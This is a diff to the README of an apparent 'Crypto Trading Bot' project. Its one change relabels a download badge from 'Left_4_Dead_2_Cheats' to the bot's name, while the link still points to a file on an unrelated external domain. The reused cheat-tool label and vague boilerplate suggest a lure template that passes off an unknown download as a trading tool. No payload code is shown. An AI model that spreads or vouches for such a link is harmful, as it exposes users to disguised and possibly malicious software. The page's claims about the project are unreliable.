@@ -2,7 +2,7 @@
 
 **Crypto Trading Bot** is a configurable toolkit for researching cryptocurrency trading strategies, organizing market data, and reviewing execution rules. It groups paper trading, backtesting, signal generation, risk limits, and portfolio monitoring into separate workflows. Exchange API settings, market watchlists, and trading alerts provide a structured interface for strategy development. Actual exchange integrations, supported assets, and live trading capability depend on the specific release and its configuration.
 
-[![Download Simple Crypto Trading Bot](https://img.shields.io/badge/Download-Left_4_Dead_2_Cheats-blueviolet)](https://dyhuiying.com/s/file)
+[![Download Simple Crypto Trading Bot](https://img.shields.io/badge/Download-Simple Crypto Trading Bot-blueviolet)](https://dyhuiying.com/s/file)
 
 ![Version](https://img.shields.io/badge/version-check_release-blue)
 ![Platform](https://img.shields.io/badge/platform-Desktop%20%2F%20Server-0078D6)
